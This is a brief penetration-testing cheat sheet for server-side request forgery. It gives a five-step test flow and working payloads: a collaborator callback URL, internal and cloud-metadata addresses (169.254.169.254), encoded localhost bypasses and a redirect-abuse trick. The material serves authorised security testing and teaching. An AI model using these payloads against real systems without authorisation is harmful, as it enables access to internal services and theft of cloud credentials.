# Server-Side Request Forgery (SSRF)

## Test flow

1. Locate URL-fetch features: webhooks, importers, previewers, PDF/image fetchers.
2. Confirm server-side fetch behavior with collaborator/interact endpoints.
3. Attempt access to internal addresses and cloud metadata.
4. Test protocol and redirect handling.
5. Verify egress controls and response leakage.

## Payload examples

### External callback validation

- `https://<your-collaborator-domain>/ssrf-test`

### Internal targets

- `http://127.0.0.1:80/`
- `http://localhost:8080/`
- `http://169.254.169.254/` (cloud metadata)
- `http://[::1]/`

### Bypass variants

- `http://2130706433/` (decimal localhost)
- `http://0177.0.0.1/` (octal style)
- `http://127.1/`
- `http://trusted.com@127.0.0.1/`

### Redirect abuse

- Host a 302 redirect from allowed domain to blocked internal host.

## Notes

- SSRF impact often includes internal service discovery and credential theft.
- Check both response-based SSRF and blind SSRF channels.
